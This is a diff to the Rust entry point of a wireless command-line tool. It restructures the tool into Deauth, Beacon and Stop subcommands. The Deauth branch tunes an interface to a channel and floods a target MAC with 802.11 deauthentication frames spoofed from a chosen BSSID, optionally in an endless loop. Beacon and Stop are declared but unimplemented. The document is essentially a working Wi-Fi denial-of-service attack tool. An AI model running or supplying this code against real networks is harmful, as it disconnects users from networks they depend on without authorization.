@@ -1,81 +1,104 @@
 use std::{thread, time::Duration};
 
 use airctl::{af_eth, helper::channel_to_freq, nl_gen};
-use clap::Parser;
+
+use clap::{Args, Parser, Subcommand};
 
 #[derive(Parser, Debug)]
 #[command(author, version, about)]
-struct Cli {
-    /// Wireless interface
-    #[arg(short, long)]
-    interface: String,
+pub struct Cli {
+    #[command(subcommand)]
+    pub command: Commands,
+}
 
-    /// Channel
+#[derive(Args, Debug, Clone)]
+pub struct WirelessArgs {
     #[arg(short, long)]
-    channel: u16,
+    pub interface: String,
+    #[arg(short, long)]
+    pub channel: u16,
+    #[arg(short, long)]
+    pub target: String,
+    #[arg(short, long)]
+    pub bssid: String,
+    #[arg(short, long)]
+    pub gap: Option<u64>,
+    #[arg(short, long)]
+    pub repeat: Option<usize>,
+}
 
-    /// Target
-    #[arg(short, long)]
-    target: String,
-
-    /// BSSID
-    #[arg(short, long)]
-    bssid: String,
-
-    /// Time Gap
-    #[arg(short, long)]
-    gap: Option<u64>,
-
-    // Repeat
-    #[arg(short, long)]
-    repeat: Option<usize>,
+#[derive(Subcommand, Debug)]
+pub enum Commands {
+    Deauth {
+        #[command(flatten)]
+        args: WirelessArgs,
+    },
+    Beacon {
+        #[command(flatten)]
+        args: WirelessArgs,
+    },
+    Stop,
 }
 
 fn main() {
     let cli = Cli::parse();
 
-    let interface = cli.interface;
-    let bssid = parse_mac(&cli.bssid);
-    let target = parse_mac(&cli.target);
-    let channel = cli.channel;
-    let gap = cli.gap;
-    let repeat = cli.repeat;
+    let command = cli.command;
 
-    let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
-    af_ctrl.sock_bind();
+    match command {
+        Commands::Deauth {
+            args:
+                WirelessArgs {
+                    interface,
+                    channel,
+                    target,
+                    bssid,
+                    gap,
+                    repeat,
+                },
+        } => {
+            let target = parse_mac(&target);
+            let bssid = parse_mac(&bssid);
 
-    thread::sleep(Duration::from_millis(200));
-    let mut nl_ctrl = nl_gen::Ctrl::new(interface);
-    nl_ctrl.bind();
+            let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
+            af_ctrl.sock_bind();
 
-    let freq = match channel_to_freq(channel) {
-        Some(freq) => freq,
-        None => panic!("Unsupported channel: {channel}"),
-    };
+            thread::sleep(Duration::from_millis(200));
+            let mut nl_ctrl = nl_gen::Ctrl::new(interface);
+            nl_ctrl.bind();
 
-    nl_ctrl.set_frequency(freq);
-    af_ctrl.drain();
+            let freq = match channel_to_freq(channel) {
+                Some(freq) => freq,
+                None => panic!("Unsupported channel: {channel}"),
+            };
 
-    match (gap, repeat) {
-        (None, Some(r)) => {
-            for _ in 0..r {
-                af_ctrl.deauth(target, bssid);
-                println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
-                thread::sleep(Duration::from_millis(500));
+            nl_ctrl.set_frequency(freq);
+            af_ctrl.drain();
+
+            match (gap, repeat) {
+                (None, Some(r)) => {
+                    for _ in 0..r {
+                        af_ctrl.deauth(target, bssid);
+                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
+                        thread::sleep(Duration::from_millis(500));
+                    }
+                }
+                (Some(g), Some(r)) => {
+                    for _ in 0..r {
+                        af_ctrl.deauth(target, bssid);
+                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
+                        thread::sleep(Duration::from_millis(g));
+                    }
+                }
+                _ => loop {
+                    af_ctrl.deauth(target, bssid);
+                    println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
+                    thread::sleep(Duration::from_millis(500));
+                },
             }
         }
-        (Some(g), Some(r)) => {
-            for _ in 0..r {
-                af_ctrl.deauth(target, bssid);
-                println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
-                thread::sleep(Duration::from_millis(g));
-            }
-        }
-        _ => loop {
-            af_ctrl.deauth(target, bssid);
-            println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
-            thread::sleep(Duration::from_millis(500));
-        },
+
+        _ => {}
     }
 }
 
